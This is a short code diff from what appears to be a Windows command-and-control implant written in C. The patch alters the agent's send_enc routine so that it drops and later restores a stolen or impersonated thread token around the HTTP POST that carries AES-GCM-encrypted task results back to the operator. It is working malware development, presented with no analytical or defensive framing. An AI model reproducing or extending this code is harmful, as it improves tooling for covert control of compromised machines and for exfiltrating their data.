@@ -613,9 +613,27 @@ static void send_enc(const char *path, const char *json_body) {
     uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
         (const uint8_t*)json_body, strlen(json_body), &enc_len);
     if (!enc) return;
+
+    /* Drop thread impersonation before the POST so WinHTTP uses the process
+       primary token.  A make-token LOGON_NEW_CREDENTIALS context sets a
+       per-thread impersonation token that can cause WinHTTP to silently fail
+       when sending encrypted result bodies. */
+    HANDLE hSavedImp = NULL;
+    {
+        HANDLE hTh = NULL;
+        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hTh)) {
+            DuplicateTokenEx(hTh, TOKEN_ALL_ACCESS, NULL,
+                             SecurityImpersonation, TokenImpersonation, &hSavedImp);
+            CloseHandle(hTh);
+            RevertToSelf();
+        }
+    }
+
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
     free(resp); free(enc);
+
+    if (hSavedImp) { ImpersonateLoggedOnUser(hSavedImp); CloseHandle(hSavedImp); }
 }
 
 // Escape a string for embedding in a JSON value (replaces \ and " with \\ and \")
